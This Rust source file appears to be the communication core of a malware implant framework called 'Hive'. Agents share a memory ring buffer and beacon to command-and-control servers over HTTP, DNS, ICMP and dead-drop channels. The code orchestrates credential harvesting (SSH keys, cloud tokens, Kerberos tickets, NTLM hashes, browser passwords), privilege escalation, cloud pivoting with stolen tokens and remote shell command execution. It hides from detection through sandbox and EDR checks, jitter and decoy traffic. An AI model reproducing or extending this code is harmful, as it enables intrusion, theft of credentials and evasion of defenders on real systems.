// Communication layer: shared-memory arena instead of TCP bus.
// Each agent writes to and reads from a common ring buffer in shared memory.
// No sockets, no ports, no separate bus process.
//
// Integrated with OPSEC (jitter + decoys + schedule), multi-channel C2
// failover, and automated credential harvesting.

use crate::arena_mgr;
use crate::ldc::{Message, Role, Value};
use crate::shared_arena as arena;
use crate::identity::AgentIdentity;
use crate::telemetry::{self, EventType, TelemetryCollector, ColonyHealth};
use ed25519_dalek::Signer;
use std::path::PathBuf;
use std::sync::Arc;
use std::sync::Mutex;
use std::sync::atomic::{AtomicU64, Ordering};
use tracing::{info, warn};
use uuid::Uuid;

use crate::opsec::OpsecEngine;
use crate::c2_channels::{FailoverDirector, C2ChannelConfig, ChannelKind, FailoverPolicy};
use crate::privesc::{self, ExploitTracker};
use crate::cloud_worker::{CloudProvider, CloudCredential};

// ── HiveChamber ─────────────────────────────────────────────────────────────

pub struct HiveChamber {
    arena: Arc<arena_mgr::SharedArenaMapping>,
    identity: AgentIdentity,
    my_slot: usize,
    my_role: u8,
    last_read_seq: AtomicU64,
    pub telemetry: Option<TelemetryCollector>,
    opsec_engine: Mutex<Option<OpsecEngine>>,
    failover: Mutex<Option<FailoverDirector>>,
    exploit_tracker: Mutex<ExploitTracker>,
}

impl HiveChamber {
    /// Connect to the swarm via shared memory arena.
    pub async fn connect(identity: &AgentIdentity, role: Role) -> Result<Self, std::io::Error> {
        let role_u8 = role_to_u8(&role);

        let mapping = arena_mgr::connect_to_arena()?;
        let ptr = mapping.as_ptr();

        if !arena::verify_arena(ptr) {
            arena::init_arena(ptr);
            let tb = telemetry::TelemetryBuffer::open(ptr);
            tb.init();
            info!("Initialized colmena arena (shared memory)");
        }

        let id_bytes = identity.id().as_bytes().to_owned();
        let slot_idx = arena::find_or_claim_agent_slot(ptr, id_bytes)
            .ok_or_else(|| std::io::Error::new(
                std::io::ErrorKind::AddrInUse,
                "Arena full - no agent slots available",
            ))?;

        arena::set_agent_role(ptr, slot_idx, role_u8);
        arena::set_verifying_key(ptr, slot_idx, identity.verifying_key_bytes());

        let now = crate::utils::timestamp_now();
        arena::update_heartbeat(ptr, slot_idx, now);

        let start_seq = arena::write_cursor_ref(ptr).load(Ordering::Acquire);

        info!(
            "Connected to colmena arena (slot {}, role: {:?})",
            slot_idx, role
        );

        let telemetry_dir = std::env::var("HIVE_TELEMETRY_DIR")
            .unwrap_or_else(|_| "/tmp/hive_telemetry".into());
        let agent_id_bytes = identity.id().as_bytes().to_owned();
        let collector = TelemetryCollector::new(
            agent_id_bytes,
            ptr,
            &PathBuf::from(&telemetry_dir),
        );

        Ok(Self {
            arena: Arc::new(mapping),
            identity: identity.clone(),
            my_slot: slot_idx,
            my_role: role_u8,
            last_read_seq: AtomicU64::new(start_seq),
            telemetry: Some(collector),
            opsec_engine: Mutex::new(None),
            failover: Mutex::new(None),
            exploit_tracker: Mutex::new(ExploitTracker::new()),
        })
    }

    /// Publish a signed LdC message to the arena.
    pub async fn publish(&self, msg: Message) {
        let ptr = self.arena.as_ptr();

        let data = rmp_serde::to_vec(&msg).unwrap_or_default();
        if data.len() > arena::MAX_MSG_SIZE {
            warn!("Message too large ({} bytes), truncating", data.len());
        }

        let sign_key = self.identity.signing_key();
        let mut signature_bytes = [0u8; 64];
        let sig = sign_key.sign(&data);
        signature_bytes.copy_from_slice(&sig.to_bytes());

        let verifying_key = self.identity.verifying_key_bytes();
        let id_bytes = self.identity.id().as_bytes().to_owned();

        let (seq, slot_idx) = arena::claim_slot(ptr);
        let slot = arena::message_slot_mut(ptr, slot_idx);

        arena::write_message_slot(
            slot,
            seq,
            msg.timestamp,
            id_bytes,
            verifying_key,
            signature_bytes,
            self.my_role,
            &data,
        );

        if let Some(ref t) = self.telemetry {
            let event_type = match &msg.payload {
                crate::ldc::Payload::Belief { .. } => EventType::BeliefPublished,
                crate::ldc::Payload::Vote { .. } => EventType::VoteCast,
                _ => EventType::MessageSerialized,
            };
            t.emit(event_type, vec![], None);
        }
    }

    // ── OPSEC engine ─────────────────────────────────────────────────────────

    /// Initialize the OPSEC engine lazily from agent identity.
    fn ensure_opsec(&self) -> std::sync::MutexGuard<'_, Option<OpsecEngine>> {
        let mut guard = self.opsec_engine.lock().unwrap();
        if guard.is_none() {
            *guard = Some(OpsecEngine::new(self.identity.id().as_bytes()));
            info!("OPSEC: engine initialized for agent {}", self.identity.id());
        }
        guard
    }

    /// Initialize the FailoverDirector lazily from env vars.
    fn ensure_failover(&self) -> std::sync::MutexGuard<'_, Option<FailoverDirector>> {
        let mut guard = self.failover.lock().unwrap();
        if guard.is_none() {
            let mut director = FailoverDirector::new(FailoverPolicy::Priority);

            // HTTP/S channel from HIVE_C2_URL env
            if std::env::var("HIVE_C2_URL").is_ok() {
                director.add_channel(C2ChannelConfig {
                    name: "http_primary".into(),
                    kind: ChannelKind::Http,
                    priority: 1,
                    ..Default::default()
                });
            }

            // DNS tunnel channel
            if let Ok(domain) = std::env::var("HIVE_C2_DNS_DOMAIN") {
                director.add_channel(C2ChannelConfig {
                    name: "dns_tunnel".into(),
                    kind: ChannelKind::DnsTunnel,
                    priority: 10,
                    endpoint: domain,
                    ..Default::default()
                });
            }

            // ICMP tunnel channel
            if let Ok(target) = std::env::var("HIVE_C2_ICMP_TARGET") {
                director.add_channel(C2ChannelConfig {
                    name: "icmp_tunnel".into(),
                    kind: ChannelKind::IcmpTunnel,
                    priority: 20,
                    endpoint: target,
                    ..Default::default()
                });
            }

            // Dead drop channel
            if let Ok(token) = std::env::var("HIVE_C2_DEAD_DROP_TOKEN") {
                let mut extra = std::collections::HashMap::new();
                extra.insert("token".into(), token);
                director.add_channel(C2ChannelConfig {
                    name: "dead_drop".into(),
                    kind: ChannelKind::DeadDrop,
                    priority: 30,
                    extra,
                    ..Default::default()
                });
            }

            // Always add at least a local HTTP fallback
            if director.channels.is_empty() {
                director.add_channel(C2ChannelConfig {
                    name: "local_log".into(),
                    kind: ChannelKind::Http,
                    priority: 99,
                    ..Default::default()
                });
            }

            info!("FailoverDirector: {} channels configured", director.channels.len());
            *guard = Some(director);
        }
        guard
    }

    /// Update OPSEC calibration from an org profile.
    pub fn calibrate_opsec(&self, profile: &crate::smoke_signals::OrgCloudProfile) {
        let mut guard = self.ensure_opsec();
        if let Some(ref mut engine) = *guard {
            engine.calibrate(profile);
            info!("OPSEC: calibrated from org profile");
        }
    }

    // ── send_heartbeat (OPSEC + multi-channel C2) ────────────────────────────

    /// Send a heartbeat: update our last_heartbeat, run OPSEC cycle, beacon C2.
    ///
    /// Integrated with OpsecEngine for jitter + decoys + schedule compliance.
    /// Integrated with FailoverDirector for multi-channel C2 delivery.
    /// Falls back to legacy raw HTTP if FailoverDirector has no channels.
    pub async fn send_heartbeat(&self) {
        let now = crate::utils::timestamp_now();
        arena::update_heartbeat(self.arena.as_ptr(), self.my_slot, now);

        if let Some(ref t) = self.telemetry {
            t.emit(EventType::HeartbeatSent, vec![], None);
        }

        // Run OPSEC cycle (decoys, schedule check)
        let opsec_delay_ms = {
            let mut guard = self.ensure_opsec();
            if let Some(ref mut engine) = *guard {
                if !engine.should_act() {
                    info!("OPSEC: heartbeat suppressed (schedule/evasion)");
                    return;
                }
                let decoy_count = engine.decoys_fired;
                let delay = engine.cycle();
                if engine.decoys_fired > decoy_count {
                    info!("OPSEC: decoy traffic fired");
                }
                delay.as_millis() as u64
            } else {
                0
            }
        };

        // Apply OPSEC jitter delay
        if opsec_delay_ms > 0 {
            tokio::time::sleep(std::time::Duration::from_millis(opsec_delay_ms)).await;
        }

        // Build beacon payload
        let beacon = format!(
            r#"{{"type":"heartbeat","agent_id":"{}","role":"{:?}","timestamp":{}}}"#,
            self.identity.id(), self.role(), now
        );

        // Send via FailoverDirector
        let sent_via_failover = {
            let mut guard = self.ensure_failover();
            if let Some(ref mut director) = *guard {
                let results = director.send_with_failover(beacon.as_bytes()).await;
                let success = results.iter().any(|r| r.success);
                if success {
                    info!("SMOKE: heartbeat sent via failover director");
                } else {
                    warn!("SMOKE: all failover channels failed for heartbeat");
                }
                success
            } else {
                false
            }
        };

        // Legacy fallback: raw HTTP to HIVE_C2_URL
        if !sent_via_failover {
            if let Ok(c2_url) = std::env::var("HIVE_C2_URL") {
                tokio::spawn(async move {
                    send_c2_beacon(&c2_url, &beacon).await;
                });
            }
        }
    }

    // ── send_harvest (automated credential harvesting) ────────────────────────

    /// Run Leech credential harvesting and publish results as beliefs.
    ///
    /// Only executes if:
    ///   - Evasion check passes (no sandbox/debugger/EDR)
    ///   - Health status is not Critical
    ///   - Role is Honeybee or Queen (workers don't harvest)
    pub async fn send_harvest(&self) {
        // Evasion check
        let risks = crate::platform_layer::runtime::evasion_check();
        if !risks.is_empty() {
            info!("LEECH: harvest suppressed — risks detected: {:?}", risks);
            return;
        }

        // Health check via telemetry AdaptiveSampler
        if let Some(ref t) = self.telemetry {
            let sampler_lock = t.sampler();
            let sampler = sampler_lock.lock().await;
            let health = sampler.health();
            if health == ColonyHealth::Critical {
                info!("LEECH: harvest suppressed — colony health is Critical");
                return;
            }
        }

        // Role filter: only Honeybee or Queen harvest
        let role = self.role();
        if role != Role::Honeybee && role != Role::Queen {
            return;
        }

        info!("LEECH: starting credential harvest cycle");

        let harvest = crate::leech::harvest_all();
        info!("LEECH: harvested {} credentials", harvest.len());

        for cred in &harvest {
            let asset = format!("credential:{}", match cred.credential_type {
                crate::leech::CredType::ShadowHash => "shadow",
                crate::leech::CredType::ProcessMemory => "proc_mem",
                crate::leech::CredType::SSHKey => "ssh_key",
                crate::leech::CredType::CloudTokenAWS => "cloud_aws",
                crate::leech::CredType::CloudTokenGCP => "cloud_gcp",
                crate::leech::CredType::CloudTokenAzure => "cloud_azure",
                crate::leech::CredType::CloudTokenK8s => "cloud_k8s",
                crate::leech::CredType::KerberosTGT => "krb_tgt",
                crate::leech::CredType::KerberosTGS => "krb_tgs",
                crate::leech::CredType::NTLMHash => "ntlm",
                crate::leech::CredType::ClearTextPassword => "cleartext",
                crate::leech::CredType::AccessToken => "access_token",
                crate::leech::CredType::RDPCredential => "rdp",
                crate::leech::CredType::VaultToken => "vault",
                crate::leech::CredType::GnupgKey => "gnupg",
                crate::leech::CredType::BrowserPassword => "browser",
            });

            let msg = Message::belief(
                self.identity.id(),
                self.role(),
                asset,
                Value::String(format!("{}@{}:{}", cred.username, cred.domain, cred.source_process)),
                cred.priority as f32 / 10.0,
            );
            self.publish(msg).await;
        }

        if !harvest.is_empty() {
            info!("LEECH: published {} credential beliefs to arena", harvest.len());
        }
    }

    // ── escalate_privileges (D-5: privilege escalation) ──────────────────────

    /// Attempt privilege escalation with adaptive interval and health checks.
    ///
    /// Returns (attempted, success) where attempted=false if skipped.
    /// Only executes if:
    ///   - Evasion check passes (no sandbox/debugger/EDR)
    ///   - Health status is not Critical
    ///   - ExploitTracker says it's time to try
    ///   - Role is Queen or Honeybee
    pub async fn escalate_privileges(&self) -> (bool, bool) {
        let role = self.role();
        if role != Role::Queen && role != Role::Honeybee {
            return (false, false);
        }

        // Evasion check
        let risks = crate::platform_layer::runtime::evasion_check();
        if !risks.is_empty() {
            info!("PRIVESC: suppressed — risks detected: {:?}", risks);
            return (false, false);
        }

        // Health check
        if let Some(ref t) = self.telemetry {
            let sampler_lock = t.sampler();
            let sampler = sampler_lock.lock().await;
            let health = sampler.health();
            if health == ColonyHealth::Critical {
                info!("PRIVESC: suppressed — colony health is Critical");
                return (false, false);
            }
        }

        // Adaptive interval check
        {
            let tracker = self.exploit_tracker.lock().unwrap();
            if !tracker.should_attempt() {
                info!("PRIVESC: waiting {}s before next attempt", tracker.wait_seconds());
                return (false, false);
            }
        }

        info!("PRIVESC: scanning for escalation vectors");
        let vectors = privesc::scan_privilege_escalation();

        if vectors.is_empty() {
            info!("PRIVESC: no vectors found");
            return (true, false);
        }

        info!("PRIVESC: attempting escalation ({} vectors)", vectors.len());
        let result = privesc::attempt_escalation(&vectors);

        {
            let mut tracker = self.exploit_tracker.lock().unwrap();
            tracker.attempts += 1;
            tracker.last_attempt = Some(std::time::Instant::now());
            if result.success {
                tracker.succeeded = result.root_shell;
            }
        }

        // Publish result as belief
        let status = if result.success { "achieved" } else { "failed" };
        let outcome = format!("{}:{}", status, result.technique);
        let msg = Message::belief(
            self.identity.id(),
            self.role(),
            format!("lpe:{}", status),
            Value::String(outcome),
            if result.success { 1.0 } else { 0.3 },
        );
        self.publish(msg).await;

        if result.success {
            info!("PRIVESC: escalation SUCCESS — root_shell={}", result.root_shell);
            // Re-run credential harvesting now with elevated privileges
            self.send_harvest().await;
        } else {
            info!("PRIVESC: escalation FAILED — next in {}s",
                self.exploit_tracker.lock().unwrap().wait_seconds());
        }

        (true, result.success)
    }

    // ── pivot_cloud (D-7: cloud worker) ──────────────────────────────────────

    /// Pivot into cloud providers using credentials from the arena.
    ///
    /// Reads `credential:cloud:*` beliefs from latest messages, extracts tokens,
    /// and runs CloudWorker::pivot_all() with rate limiting.
    /// Returns (executed, resources_found).
    pub async fn pivot_cloud(&self) -> (bool, u32) {
        let role = self.role();
        if role != Role::Queen && role != Role::Honeybee {
            return (false, 0);
        }

        // Check basic internet connectivity
        if !crate::cloud_worker::CloudWorker::check_connectivity() {
            info!("CLOUD: no internet connectivity — skipping pivot");
            return (false, 0);
        }

        // Collect cloud credentials from the arena
        let messages = self.read_new().await;
        let mut credentials = Vec::new();

        for msg in &messages {
            if let crate::ldc::Payload::Belief { asset, value, .. } = &msg.payload {
                if !asset.starts_with("credential:cloud:") {
                    continue;
                }
                let provider = match asset.as_str() {
                    "credential:cloud:aws" => Some(CloudProvider::Aws),
                    "credential:cloud:gcp" => Some(CloudProvider::Gcp),
                    "credential:cloud:azure" => Some(CloudProvider::Azure),
                    "credential:cloud:k8s" => Some(CloudProvider::K8s),
                    _ => None,
                };
                if let Some(provider) = provider {
                    let data = match value {
                        Value::String(s) => s.clone(),
                        _ => continue,
                    };
                    credentials.push(CloudCredential {
                        provider,
                        token: data,
                        account_id: self.identity.id().to_string(),
                        region: "us-east-1".into(),
                        source: format!("arena:{}", msg.agent_id),
                    });
                }
            }
        }

        if credentials.is_empty() {
            info!("CLOUD: no cloud credentials found in arena");
            return (false, 0);
        }

        info!("CLOUD: found {} cloud credentials, pivoting", credentials.len());
        let mut worker = crate::cloud_worker::CloudWorker::new();
        let results = worker.pivot_all(&credentials);

        let total_resources: u32 = results.iter().map(|r| r.resources_found).sum();

        for result in &results {
            let asset = format!("cloud:pivoted:{}:{}", match result.provider {
                CloudProvider::Aws => "aws",
                CloudProvider::Gcp => "gcp",
                CloudProvider::Azure => "azure",
                CloudProvider::K8s => "k8s",
            }, result.action.replace(' ', "_"));

            let msg = Message::belief(
                self.identity.id(),
                self.role(),
                asset,
                Value::String(format!("{}:{}", result.output, result.resources_found)),
                if result.success { 0.8 } else { 0.2 },
            );
            self.publish(msg).await;
        }

        info!("CLOUD: pivot complete — {} results, {} total resources",
            results.len(), total_resources);

        (true, total_resources)
    }

    // ── execute_command (D-6: remote shell via arena) ───────────────────────

    /// Dispatch a shell command via arena Request for remote execution.
    /// Other agents (Queen, Honeybee) pick up `service:"exec"` requests,
    /// execute them, and publish the result as a belief.
    /// Returns the cmd_id for tracking.
    pub async fn execute_command(&self, cmd: &str) -> Uuid {
        let cmd_id = Uuid::new_v4();
        let payload = rmp_serde::to_vec(&serde_json::json!({
            "cmd": cmd,
            "cmd_id": cmd_id.to_string(),
        })).unwrap_or_default();

        let msg = Message {
            agent_id: self.identity.id(),
            agent_role: self.role(),
            timestamp: crate::utils::timestamp_now(),
            payload: crate::ldc::Payload::Request {
                service: "exec".into(),
                payload,
            },
        };
        self.publish(msg).await;
        info!("EXEC: dispatched cmd_id={}: {}", cmd_id, cmd);
        cmd_id
    }

    // ── send_beacon_c2 (multi-channel beaconing) ─────────────────────────────

    /// Send an arbitrary beacon payload through the failover C2 channels.
    pub async fn send_beacon_c2(&self, data: &[u8]) -> bool {
        let mut guard = self.ensure_failover();
        if let Some(ref mut director) = *guard {
            let results = director.send_with_failover(data).await;
            let success = results.iter().any(|r| r.success);
            if success {
                info!("C2: beacon delivered via failover ({} channels tried)", results.len());
            } else {
                warn!("C2: beacon failed on all {} channels", results.len());
            }
            success
        } else {
            false
        }
    }

    // ── accessors (unchanged API) ────────────────────────────────────────────

    pub async fn read_new(&self) -> Vec<Message> {
        let ptr = self.arena.as_ptr();
        let mut messages = Vec::new();

        let current_cursor = arena::write_cursor_ref(ptr);
        let latest_seq = current_cursor.load(Ordering::Acquire);
        let mut my_seq = self.last_read_seq.load(Ordering::Relaxed);

        if latest_seq > my_seq + (arena::MAX_MESSAGES as u64) {
            my_seq = latest_seq.saturating_sub(arena::MAX_MESSAGES as u64);
        }

        while my_seq < latest_seq {
            let slot_idx = (my_seq % arena::MAX_MESSAGES as u64) as usize;
            let slot = arena::message_slot_ptr(ptr, slot_idx);

            let slot_seq = arena::read_slot_seq(slot);
            if slot_seq > my_seq { my_seq += 1; continue; }
            if slot_seq == 0 { break; }

            unsafe {
                let payload_len = (*slot).payload_len as usize;
                if payload_len > 0 && payload_len <= arena::MAX_MSG_SIZE {
                    let before_seq = (*slot).seq.load(Ordering::Acquire);
                    if before_seq != slot_seq || before_seq == 0 { my_seq += 1; continue; }

                    let mut payload_buf = [0u8; arena::MAX_MSG_SIZE];
                    std::ptr::copy_nonoverlapping(
                        (*slot).payload.as_ptr(), payload_buf.as_mut_ptr(), payload_len,
                    );

                    let after_seq = (*slot).seq.load(Ordering::Acquire);
                    if after_seq != before_seq { my_seq += 1; continue; }

                    let payload_slice = &payload_buf[..payload_len];
                    let vk_bytes = &(*slot).verifying_key;
                    let sig_bytes = &(*slot).signature;

                    if !AgentIdentity::verify_with_key(vk_bytes, payload_slice, sig_bytes) {
                        my_seq += 1; continue;
                    }

                    if let Ok(msg) = rmp_serde::from_slice::<Message>(payload_slice) {
                        if msg.agent_id.as_bytes() == &(*slot).agent_id
                            && msg.agent_id != self.identity.id()
                        {
                            messages.push(msg);
                        }
                    }
                }
            }
            my_seq += 1;
        }

        self.last_read_seq.store(my_seq, Ordering::Release);
        messages
    }

    pub async fn get_active_agents(&self, timeout_secs: u64) -> Vec<(Uuid, Role, u64)> {
        let ptr = self.arena.as_ptr();
        let now = crate::utils::timestamp_now();
        let mut agents = Vec::new();

        arena::enumerate_agents(ptr, |id_bytes, role_u8, hb, _vk| {
            if now.saturating_sub(hb) < timeout_secs {
                let id = Uuid::from_bytes(id_bytes);
                let role = u8_to_role(role_u8);
                agents.push((id, role, hb));
            }
        });

        agents
    }

    pub async fn check_dead_agents(&self, timeout_secs: u64) -> Vec<Uuid> {
        let ptr = self.arena.as_ptr();
        let now = crate::utils::timestamp_now();
        let mut dead = Vec::new();

        for i in 0..arena::MAX_AGENTS {
            let flags = arena::agent_flags_val(ptr, i);
            if (flags & 1) != 0 && (flags & 2) == 0 {
                let hb = arena::last_heartbeat_val(ptr, i);
                if now.saturating_sub(hb) > timeout_secs {
                    let id_bytes = arena::agent_id_val(ptr, i);
                    arena::mark_agent_dead(ptr, i);
                    let id = Uuid::from_bytes(id_bytes);
                    warn!("Agent {} marked DEAD (no heartbeat for {}s)", id, now - hb);
                    dead.push(id);
                }
            }
        }

        dead
    }

    pub fn arena_ptr(&self) -> *mut u8 { self.arena.as_ptr() }
    pub fn agent_id(&self) -> Uuid { self.identity.id() }
    pub fn role(&self) -> Role { u8_to_role(self.my_role) }
    pub fn identity(&self) -> &AgentIdentity { &self.identity }
    pub fn my_slot_idx(&self) -> usize { self.my_slot }
}

fn u8_to_role(val: u8) -> Role {
    match val {
        0 => Role::Worker,
        1 => Role::Weaver,
        2 => Role::Drone,
        3 => Role::Honeybee,
        4 => Role::Queen,
        5 => Role::Swarm,
        _ => Role::Worker,
    }
}

fn role_to_u8(role: &Role) -> u8 {
    match role {
        Role::Worker => 0,
        Role::Weaver => 1,
        Role::Drone => 2,
        Role::Honeybee => 3,
        Role::Queen => 4,
        Role::Swarm => 5,
    }
}

/// Legacy fallback: send a beacon via raw HTTPS POST.
async fn send_c2_beacon(c2_url: &str, body: &str) {
    let client = match reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .user_agent("Hive/3.0")
        .build()
    {
        Ok(c) => c,
        Err(_) => return,
    };
    let _ = client
        .post(c2_url)
        .header("Content-Type", "application/json")
        .body(body.to_owned())
        .send()
        .await;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_role_to_u8() {
        assert_eq!(role_to_u8(&Role::Worker), 0);
        assert_eq!(role_to_u8(&Role::Queen), 4);
        assert_eq!(role_to_u8(&Role::Swarm), 5);
    }

    #[test]
    fn test_u8_to_role() {
        assert_eq!(u8_to_role(0), Role::Worker);
        assert_eq!(u8_to_role(4), Role::Queen);
        assert_eq!(u8_to_role(99), Role::Worker);
    }

    #[test]
    fn test_opsec_initialization() {
        // Verify OPSEC engine can be created without panic
        let engine = OpsecEngine::new(b"test-agent");
        assert_eq!(engine.decoys_fired, 0);
    }

    #[test]
    fn test_failover_default_config() {
        // Verify FailoverDirector can hold channels
        let mut director = FailoverDirector::new(FailoverPolicy::Priority);
        director.add_channel(C2ChannelConfig {
            name: "test".into(),
            kind: ChannelKind::Http,
            priority: 1,
            ..Default::default()
        });
        assert_eq!(director.channels.len(), 1);
    }
}
